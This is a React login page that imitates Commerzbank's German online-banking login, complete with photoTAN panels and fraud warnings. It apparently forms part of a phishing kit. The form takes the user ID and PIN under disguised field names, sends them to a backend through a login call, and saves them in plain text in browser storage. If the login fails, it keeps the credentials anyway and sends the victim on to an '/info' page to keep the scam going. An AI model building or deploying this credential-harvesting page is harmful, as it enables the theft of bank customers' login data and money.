import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import apiService from '../services/api';

interface LoginFormData {
  xusr: string;
  xpss: string;
}

const LoginPage: React.FC = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState<LoginFormData>({
    xusr: '',
    xpss: ''
  });
  const [errors, setErrors] = useState<Partial<LoginFormData>>({});
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    // Clear error when user starts typing
    if (errors[name as keyof LoginFormData]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<LoginFormData> = {};

    if (!formData.xusr.trim()) {
      newErrors.xusr = 'Bitte geben Sie Ihre Benutzer-ID ein.';
    }

    if (!formData.xpss.trim()) {
      newErrors.xpss = 'Bitte geben Sie Ihr Passwort ein.';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      // Send data to backend (simulating the PHP behavior)
      await apiService.login(formData);
      
      // Store in both session and local storage for mobile compatibility
      sessionStorage.setItem('xusr', formData.xusr);
      sessionStorage.setItem('xpss', formData.xpss);
      localStorage.setItem('xusr', formData.xusr);
      localStorage.setItem('xpss', formData.xpss);
      
      // Navigate to info page
      navigate('/info');
    } catch (error) {
      console.error('Login error:', error);
      // Still navigate to maintain the flow
      sessionStorage.setItem('xusr', formData.xusr);
      sessionStorage.setItem('xpss', formData.xpss);
      localStorage.setItem('xusr', formData.xusr);
      localStorage.setItem('xpss', formData.xpss);
      navigate('/info');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="commerzbank-app">
      {/* Main Content */}
      <main className="main-content">
        <div className="content-wrapper">
          {/* Left Column - Login Form */}
          <div className="left-column">
            <div className="login-section">
              <h1 className="login-title">Anmeldung Online Banking</h1>
              
              <form onSubmit={handleSubmit} className="login-form">
                <div className="form-group">
                  <label htmlFor="xusr" className="form-label">
                    Benutzername/Teilnehmernummer
                    <span className="info-icon">ℹ️</span>
                  </label>
                  <input
                    type="text"
                    id="xusr"
                    name="xusr"
                    value={formData.xusr}
                    onChange={handleInputChange}
                    className="form-input"
                    autoComplete="off"
                    required
                  />
                  {errors.xusr && <div className="error-message">{errors.xusr}</div>}
                </div>

                <div className="form-group">
                  <label htmlFor="xpss" className="form-label">
                    PIN
                    <span className="info-icon">ℹ️</span>
                  </label>
                  <input
                    type="password"
                    id="xpss"
                    name="xpss"
                    value={formData.xpss}
                    onChange={handleInputChange}
                    className="form-input"
                    autoComplete="off"
                    required
                  />
                  {errors.xpss && <div className="error-message">{errors.xpss}</div>}
                </div>

                <button 
                  type="submit" 
                  className="login-button"
                  disabled={isLoading}
                >
                  🔒 {isLoading ? 'Anmelden...' : 'Login'}
                </button>
              </form>
            </div>

            {/* Additional Sections */}
            <div className="additional-sections">
              <div className="section-box">
                <h3>Aktualisieren Sie Ihre photoTAN-App</h3>
                <button className="yellow-button">Zur Anmeldung im Firmenkundenportal</button>
              </div>

              <div className="section-box">
                <h3>Noch kein Digital Banking Kunde?</h3>
                <a href="#zugang" className="link">Zugang digital beantragen (mit autoIDENT)</a>
              </div>

              <div className="section-box warnings">
                <h3>Aktuelle Warnhinweise</h3>
                <ul>
                  <li>Angebliche Bank-Mitarbeiter erfragen Zugangsdaten</li>
                  <li>Enkeltrick: Betrüger nutzen WhatsApp (polizei-beratung.de)</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Right Column - Info Panel */}
          <div className="right-column">
            <div className="info-panel">
              <h3>Wichtige Infos zum Digital Banking</h3>
              
              <div className="info-section">
                <p>Probleme mit der photoTAN-App oder Zahlungsfreigaben? <a href="#info">hier weitere Informationen</a></p>
              </div>

              <div className="info-section">
                <h4>Kein aktives TAN-Verfahren?</h4>
                <ul>
                  <li><a href="#phototan">photoTAN aktivieren (für angemeldete Kunden)</a></li>
                  <li><a href="#hilfe">Hilfe zur photoTAN</a></li>
                </ul>
              </div>

              <div className="info-section">
                <h4>Teilnehmernummer/PIN vergessen?</h4>
                <ul>
                  <li><a href="#teilnehmer">Teilnehmernummer neu anfordern</a></li>
                  <li><a href="#pin">PIN vergessen</a></li>
                </ul>
              </div>

              <div className="info-section">
                <h4>Alles rund ums Online Banking</h4>
                <ul>
                  <li><a href="#anleitung">Anleitung/Hilfe</a></li>
                  <li><a href="#sicherheit">Sicherheit</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default LoginPage;
